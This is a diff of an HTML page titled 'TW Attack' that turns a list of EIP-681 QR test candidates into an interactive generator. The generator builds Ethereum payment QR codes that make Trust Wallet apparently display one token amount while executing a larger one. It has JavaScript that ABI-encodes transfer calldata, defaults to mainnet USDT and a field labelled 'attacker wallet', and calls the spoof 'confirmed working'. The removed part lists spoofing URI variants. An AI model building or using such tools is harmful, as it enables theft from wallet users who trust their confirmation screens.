@@ -3,110 +3,240 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>TW Attack — EIP-681 /transfer Candidates (Mainnet)</title>
+  <title>TW Attack — EIP-681 /transfer QR Generator</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 16px; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 16px; max-width: 700px; margin: 0 auto; }
     h1 { font-size: 20px; margin-bottom: 4px; color: #f0883e; }
     .subtitle { font-size: 12px; color: #8b949e; margin-bottom: 16px; }
-    .variant { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
-    .variant h2 { font-size: 15px; margin-bottom: 2px; color: #e6edf3; }
-    .variant .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: 600; margin-bottom: 6px; }
-    .badge-main { background: #d2992222; color: #d29922; border: 1px solid #d2992244; }
-    .qr-img { width: 240px; height: 240px; display: block; margin: 8px auto; border-radius: 8px; background: white; padding: 8px; }
-    .uri-box { font-size: 10px; color: #8b949e; word-break: break-all; background: #0d1117; padding: 8px; border-radius: 6px; margin: 8px 0; font-family: monospace; max-height: 100px; overflow-y: auto; border: 1px solid #21262d; }
-    .info { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 8px 0; }
-    .info div { background: #0d1117; padding: 6px 8px; border-radius: 6px; }
-    .info .label { font-size: 9px; color: #8b949e; text-transform: uppercase; }
-    .info .value { font-size: 13px; font-weight: 600; margin-top: 2px; }
-    .info .value.red { color: #ff6b6b; }
-    .info .value.green { color: #3fb950; }
-    .logic { font-size: 11px; color: #8b949e; background: #0d1117; padding: 8px; border-radius: 6px; margin-top: 8px; border-left: 3px solid #f0883e; }
-    .note { background: #f0883e11; border: 1px solid #f0883e33; border-radius: 8px; padding: 12px; font-size: 12px; margin-bottom: 16px; color: #c9d1d9; }
-    .note strong { color: #f0883e; }
-    .attribution { text-align: center; font-size: 10px; color: #484f58; margin-top: 20px; }
+    .insight-card { background: #161b22; border: 1px solid #f0883e44; border-radius: 12px; padding: 14px; margin-bottom: 16px; }
+    .insight-card h3 { font-size: 13px; color: #f0883e; margin-bottom: 6px; }
+    .insight-card p { font-size: 12px; color: #c9d1d9; line-height: 1.5; }
+    .insight-card code { background: #0d1117; padding: 1px 5px; border-radius: 3px; font-size: 11px; color: #7ee787; }
+    .form-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    label { display: block; font-size: 12px; color: #8b949e; margin-bottom: 4px; margin-top: 12px; }
+    label:first-child { margin-top: 0; }
+    input, select { width: 100%; padding: 10px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: #e6edf3; font-size: 14px; font-family: monospace; }
+    input:focus, select:focus { outline: none; border-color: #f0883e; }
+    .hint { font-size: 10px; color: #8b949e; margin-top: 3px; }
+    .btn-row { display: flex; gap: 8px; margin-top: 16px; }
+    .btn { flex: 1; padding: 10px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; }
+    .btn-primary { background: #f0883e; color: #0d1117; }
+    .btn-primary:hover { background: #f0a05e; }
+    .btn-secondary { background: #21262d; color: #e6edf3; border: 1px solid #30363d; }
+    .btn-secondary:hover { background: #30363d; }
+    .output-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; display: none; }
+    .output-card.visible { display: block; }
+    .qr-display { text-align: center; margin: 12px 0; }
+    .qr-display img { max-width: 280px; max-height: 280px; border-radius: 8px; background: white; padding: 8px; margin: 0 auto; }
+    .uri-box { font-size: 10px; color: #8b949e; word-break: break-all; background: #0d1117; padding: 10px; border-radius: 6px; margin: 12px 0; font-family: monospace; max-height: 80px; overflow-y: auto; border: 1px solid #21262d; }
+    .result-info { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 12px 0; }
+    .result-info div { background: #0d1117; padding: 8px 10px; border-radius: 6px; }
+    .result-info .label { font-size: 9px; color: #8b949e; text-transform: uppercase; }
+    .result-info .value { font-size: 15px; font-weight: 600; margin-top: 2px; }
+    .result-info .value.display { color: #f0883e; }
+    .result-info .value.execute { color: #ff6b6b; }
+    .status { font-size: 12px; color: #8b949e; margin-top: 8px; }
+    .status.ok { color: #3fb950; }
+    .status.err { color: #ff6b6b; }
+    .built-with { text-align: center; font-size: 10px; color: #484f58; margin-top: 24px; }
+    @media (max-width: 480px) {
+      body { padding: 10px; }
+      .result-info { grid-template-columns: 1fr; }
+      .btn-row { flex-direction: column; }
+    }
   </style>
 </head>
 <body>
-  <h1>🔬 EIP-681 /transfer — 4 Candidates</h1>
-  <p class="subtitle">Mainnet • USDT • Display=1 USDT • Execute=4 USDT • All use /transfer function name</p>
+  <h1>🔬 EIP-681 /transfer — QR Generator</h1>
+  <p class="subtitle">Proven data-override format • Display ≠ Execute</p>
 
-  <div class="note">
-    <strong>Approach:</strong> All 4 use the EIP-681 <code>/transfer</code> function name format. The goal is to make Trust Wallet display 1 USDT (from <code>uint256=1000000</code>) but execute 4 USDT through parameter confusion, data override, or duplicate values.
+  <div class="insight-card">
+    <h3>⚡ Proven Attack Vector</h3>
+    <p>
+      Trust Wallet parses the EIP-681 <code>/transfer</code> function parameters for <strong>display</strong> but 
+      executes the raw <code>data</code> parameter as transaction calldata. This lets you show 1 USDT 
+      (via <code>uint256=1000000</code>) while executing 4+ USDT (via <code>data</code> containing ABI-encoded calldata).
+      <br><br>
+      <strong>Format:</strong><br>
+      <code>ethereum:0xTOKEN@1/transfer?address=RECIPIENT&amp;uint256={displayAmount}&amp;data=0xa9059cbb...</code>
+      <br><br>
+      <strong>How it works:</strong> The <code>data</code> field contains the full ABI-encoded calldata 
+      (function selector + padded address + padded amount). Trust Wallet shows the declared <code>uint256</code> 
+      amount in the confirmation screen, but sends the <code>data</code> as raw calldata — which encodes a 
+      <em>different</em> amount. Tested on iOS &amp; Android — <strong style="color:#3fb950">confirmed working</strong>.
+    </p>
   </div>
 
-  <div class="variant">
-    <span class="badge badge-main">Mainnet</span>
-    <h2>T1: pay- prefix + data override</h2>
-    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=ethereum%3Apay-0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D1000000%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR T1" loading="lazy">
-    <div class="uri-box">ethereum:pay-0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=1000000&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
-    <div class="info">
+  <div class="form-card">
+    <label>Token Contract Address</label>
+    <input type="text" id="token" value="0xdAC17F958D2ee523a2206206994597C13D831ec7" placeholder="0xtoken">
+    <div class="hint">USDT Mainnet (default) — or any ERC-20 with transfer()</div>
+
+    <label>Recipient Address (attacker wallet)</label>
+    <input type="text" id="recipient" value="0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a" placeholder="0xrecipient">
+
+    <label>Display Amount (shown in confirmation)</label>
+    <input type="number" id="displayAmount" value="1" min="0" step="0.01">
+    <div class="hint">Trust Wallet shows this — e.g. 1 = 1 USDT</div>
+
+    <label>Execute Amount (actual calldata encodes this)</label>
+    <input type="number" id="executeAmount" value="4" min="0" step="0.01">
+    <div class="hint">The data field overrides with this amount</div>
+
+    <label>Token Decimals</label>
+    <select id="decimals">
+      <option value="6" selected>6 (USDT, USDC)</option>
+      <option value="18">18 (most ERC-20)</option>
+      <option value="8">8 (WBTC)</option>
+    </select>
+
+    <label>Chain ID</label>
+    <select id="chainId">
+      <option value="1" selected>1 — Ethereum Mainnet</option>
+      <option value="11155111">11155111 — Sepolia Testnet</option>
+      <option value="137">137 — Polygon</option>
+      <option value="56">56 — BSC</option>
+    </select>
+
+    <div class="btn-row">
+      <button class="btn btn-primary" id="generateBtn">🔗 Generate QR</button>
+      <button class="btn btn-secondary" id="resetBtn">Reset Defaults</button>
+    </div>
+  </div>
+
+  <div class="output-card" id="outputCard">
+    <h2 style="font-size: 15px; margin-bottom: 4px;">📱 Scan This QR</h2>
+    <p class="subtitle" style="margin-bottom: 8px;">Open Trust Wallet → tap QR scanner icon</p>
+
+    <div class="qr-display" id="qrDisplay"></div>
+
+    <div class="uri-box" id="uriBox"></div>
+
+    <div class="result-info">
       <div>
-        <div class="label">📱 Should Display</div>
-        <div class="value red">1 USDT (from uint256)</div>
+        <div class="label">📱 Wallet Shows</div>
+        <div class="value display" id="displayValue">—</div>
       </div>
       <div>
-        <div class="label">⚡ Should Execute</div>
-        <div class="value green">4 USDT (from data override)</div>
+        <div class="label">⚡ Actually Executes</div>
+        <div class="value execute" id="executeValue">—</div>
       </div>
     </div>
-    <div class="logic">💡 pay- prefix may trigger different parser path. uint256=1M sets display to 1 USDT. data=4USDT_calldata overrides execution if wallet passes data through.</div>
+
+    <div class="status" id="statusMsg">Ready</div>
   </div>
 
-  <div class="variant">
-    <span class="badge badge-main">Mainnet</span>
-    <h2>T2: Duplicate uint256 (first=display, last=execute)</h2>
-    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D1000000%26uint256%3D4000000" alt="QR T2" loading="lazy">
-    <div class="uri-box">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=1000000&uint256=4000000</div>
-    <div class="info">
-      <div>
-        <div class="label">📱 Should Display</div>
-        <div class="value red">1 USDT (first uint256)</div>
-      </div>
-      <div>
-        <div class="label">⚡ Should Execute</div>
-        <div class="value green">4 USDT (second uint256?)</div>
-      </div>
-    </div>
-    <div class="logic">💡 If parser reads first uint256 for display but last uint256 for ABI encoding, mismatch occurs. Standard URI parsers often take last value for duplicate keys.</div>
-  </div>
+  <p class="built-with">Built with insight from real Trust Wallet testing • data parameter overrides ABI encoding</p>
 
-  <div class="variant">
-    <span class="badge badge-main">Mainnet</span>
-    <h2>T3: value/uint256 confusion</h2>
-    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D1000000%26value%3D4000000" alt="QR T3" loading="lazy">
-    <div class="uri-box">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=1000000&value=4000000</div>
-    <div class="info">
-      <div>
-        <div class="label">📱 Should Display</div>
-        <div class="value red">1 USDT (from uint256) or 4 ETH (from value?)</div>
-      </div>
-      <div>
-        <div class="label">⚡ Should Execute</div>
-        <div class="value green">4 USDT if wallet confuses value with token amount</div>
-      </div>
-    </div>
-    <div class="logic">💡 EIP-681 says 'value' = native ETH. But if wallet's ERC-20 parser uses 'value' instead of 'uint256' for token amount, it executes 4M instead of 1M.</div>
-  </div>
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+  <script>
+    (function() {
+      const TOKEN_NAMES = {
+        '0xdac17f958d2ee523a2206206994597c13d831ec7': 'USDT',
+        '0xf07a16d28055d1e40e9c934628d043c8a9b2cabf': 'USDT (Mock)',
+        '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48': 'USDC'
+      };
 
-  <div class="variant">
-    <span class="badge badge-main">Mainnet</span>
-    <h2>T4: data override (no pay- prefix)</h2>
-    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D1000000%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR T4" loading="lazy">
-    <div class="uri-box">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=1000000&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
-    <div class="info">
-      <div>
-        <div class="label">📱 Should Display</div>
-        <div class="value red">1 USDT (from uint256)</div>
-      </div>
-      <div>
-        <div class="label">⚡ Should Execute</div>
-        <div class="value green">4 USDT (from data)</div>
-      </div>
-    </div>
-    <div class="logic">💡 Standard EIP-681 /transfer. uint256=1M sets display. If wallet also accepts 'data' as raw calldata and prioritizes it over self-built calldata, execution = 4 USDT.</div>
-  </div>
+      function padHex(val, bytes) {
+        return val.toString(16).toLowerCase().padStart(bytes * 2, '0');
+      }
 
-  <p class="attribution">Scan with Trust Wallet • Report exact confirmation screen (amount, recipient, network, function name)</p>
+      // ABI-encode transfer(address,uint256) → 0xa9059cbb + padded_addr + padded_amount
+      function encodeTransferCall(recipientRaw, amountHuman, decimals) {
+        const recipient = recipientRaw.replace('0x', '').toLowerCase();
+        const tokenAmount = BigInt(Math.round(amountHuman * Math.pow(10, decimals)));
+        return '0xa9059cbb' + 
+               recipient.padStart(64, '0') + 
+               padHex(tokenAmount, 32);
+      }
+
+      function generateQR() {
+        const token = document.getElementById('token').value.trim();
+        const recipient = document.getElementById('recipient').value.trim();
+        const displayAmt = parseFloat(document.getElementById('displayAmount').value) || 0;
+        const executeAmt = parseFloat(document.getElementById('executeAmount').value) || 0;
+        const decimals = parseInt(document.getElementById('decimals').value);
+        const chainId = document.getElementById('chainId').value;
+
+        if (!/^0x[a-fA-F0-9]{40}$/.test(token)) {
+          setStatus('❌ Invalid token address', false);
+          return;
+        }
+        if (!/^0x[a-fA-F0-9]{40}$/.test(recipient)) {
+          setStatus('❌ Invalid recipient address', false);
+          return;
+        }
+        if (displayAmt <= 0 || executeAmt <= 0) {
+          setStatus('❌ Amounts must be positive', false);
+          return;
+        }
+
+        const displayUnits = Math.round(displayAmt * Math.pow(10, decimals));
+        const encodedCall = encodeTransferCall(recipient, executeAmt, decimals);
+        const uri = 'ethereum:' + token + '@' + chainId + '/transfer?address=' + 
+                    recipient + '&uint256=' + displayUnits + '&data=' + encodedCall;
+
+        const tokenKey = token.toLowerCase();
+        const tokenName = TOKEN_NAMES[tokenKey] || 'Token';
+
+        document.getElementById('uriBox').textContent = uri;
+        document.getElementById('displayValue').textContent = displayAmt + ' ' + tokenName;
+        document.getElementById('executeValue').textContent = executeAmt + ' ' + tokenName;
+
+        const qrContainer = document.getElementById('qrDisplay');
+        qrContainer.innerHTML = '';
+
+        let done = false;
+        if (typeof QRCode !== 'undefined') {
+          try {
+            new QRCode(qrContainer, {
+              text: uri,
+              width: 280, height: 280,
+              colorDark: '#000000',
+              colorLight: '#ffffff',
+              correctLevel: QRCode.CorrectLevel.H
+            });
+            done = true;
+          } catch(e) {}
+        }
+        if (!done) {
+          const img = document.createElement('img');
+          img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=' + encodeURIComponent(uri);
+          img.alt = 'QR — scan with Trust Wallet';
+          img.loading = 'lazy';
+          qrContainer.appendChild(img);
+        }
+
+        setStatus('✅ Shows ' + displayAmt + ' ' + tokenName + ' • Executes ' + executeAmt + ' ' + tokenName, true);
+        document.getElementById('outputCard').classList.add('visible');
+      }
+
+      function setStatus(msg, ok) {
+        const el = document.getElementById('statusMsg');
+        el.textContent = msg;
+        el.className = 'status ' + (ok ? 'ok' : 'err');
+      }
+
+      function resetForm() {
+        document.getElementById('token').value = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+        document.getElementById('recipient').value = '0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a';
+        document.getElementById('displayAmount').value = '1';
+        document.getElementById('executeAmount').value = '4';
+        document.getElementById('decimals').value = '6';
+        document.getElementById('chainId').value = '1';
+        document.getElementById('outputCard').classList.remove('visible');
+        setStatus('Ready', false);
+      }
+
+      document.getElementById('generateBtn').addEventListener('click', generateQR);
+      document.getElementById('resetBtn').addEventListener('click', resetForm);
+      document.querySelectorAll('input, select').forEach(el => {
+        el.addEventListener('keydown', function(e) {
+          if (e.key === 'Enter') generateQR();
+        });
+      });
+    })();
+  </script>
 </body>
 </html>
